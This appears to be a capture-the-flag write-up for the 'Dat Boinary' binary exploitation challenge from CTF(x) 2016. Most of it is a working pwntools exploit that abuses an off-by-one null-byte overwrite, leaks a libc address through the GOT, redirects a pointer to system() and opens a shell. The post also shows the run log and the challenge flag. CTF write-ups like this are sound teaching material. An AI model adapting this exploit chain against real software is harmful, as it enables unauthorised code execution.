---
title: "CTF(x) 2016 - Dat Boinary (Binary)"
header:
  overlay_image: /assets/images/ctfx2016/datboinary/header.jpg
  overlay_filter: 0.7
tags:
  - ctfx2016
  - writeup
  - pwn
---

Off-by-one error allows overwrite of a null byte that allows for a struct to be
completely filled with non-null bytes which tricks strlen into returning a large
value to read allowing overwrites of a pointer.

## Challenge Description

#### Points

250

## Solution

We were pretty happy to have solved this first during the competition.

![1]({{ site.url }}{{ site.baseurl }}/assets/images/ctfx2016/datboinary/1.png){: .align-center}

Here's the solving script:

```python
from pwn import *
import time

#context.log_level = "debug"

puts_got_address = 0x8049118

# Remote libc
puts_offset = 0x64da0
binsh_offset = 0x15f771
system_offset = 0x3e3e0

# Local libc
#puts_offset = 0x62b30
#binsh_offset = 0x15f803
#system_offset = 0x3b340

def read_bs(p):
    p.recv(5012)

def main():
#    p = process("./dat-boinary")
    p = remote("problems.ctfx.io", 1337)
    p.recv(0x51)

    # Send ID
    p.send("A"*8)
    p.recv(0xca)

    # Overwrite null byte
    p.sendthen("5)", "5\n")

    # Overwrite meme buffer
    meme_payload = "B"*12 + p32(puts_got_address) + "AAAAAAA\n"
    p.sendthen("3nt3r ur m3m3 id", "1\n")
    p.sendthen("5)", meme_payload)

    # Let us write to our new meme buffer
    p.sendline("2")
    p.sendline("5") # Write 4 bytes
    p.recvrepeat(0.5)

    # Leak something from the meme buffer
    meme_leak = p.sendthen("5)", "4\n")
    puts_address = u32(meme_leak[18:22])
    log.info("puts address: 0x%x" % puts_address)

    # Calculate libc base
    libc_base = puts_address - puts_offset
    log.info("libc base: 0x%x" % libc_base)
    system_address = libc_base + system_offset
    log.info("system: 0x%x" % system_address)
    binsh_address = libc_base + binsh_offset
    log.info("binsh: 0x%x" % binsh_address)

    p.sendline("3")
    p.send(p32(system_address))

    p.sendline("5")
    p.recvrepeat(1)
    log.success("Enjoy shell")

    p.interactive()

if __name__ == "__main__":
    main()
```

Running the script:

```shell
amon@Evanna:~/ctf/ctfx/binary/datboinary$ python exploit.py
[+] Opening connection to problems.ctfx.io on port 1337: Done
[*] puts address: 0xf75cdda0
[*] libc base: 0xf7569000
[*] system: 0xf75a73e0
[*] binsh: 0xf76c8771
[+] Enjoy shell
[*] Switching to interactive mode
$ id
uid=1000(dat_boinary) gid=1000(dat_boinary) groups=1000(dat_boinary)
$ ls
dat_boinary
flag.txt
$ cat flag.txt
ctf(0n1y_th3_fr35h35t_m3m3s)


$
```

Flag: **ctf(0n1y\_th3\_fr35h35t\_m3m3s)**
